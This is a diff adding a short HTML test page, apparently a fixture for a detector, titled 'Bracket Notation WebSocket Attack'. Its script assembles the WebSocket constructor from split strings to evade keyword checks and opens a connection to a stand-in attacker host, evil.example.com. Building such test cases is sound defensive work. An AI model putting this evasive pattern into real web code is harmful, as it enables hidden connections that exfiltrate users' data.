@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Bracket Notation WebSocket Attack</title>
+</head>
+<body>
+  <div id="root">Display</div>
+  <script>
+    // Attack: Bracket notation to access WebSocket
+    const WS = window['Web' + 'Socket'];
+    const ws = new WS('wss://evil.example.com/ws');
+  </script>
+</body>
+</html>
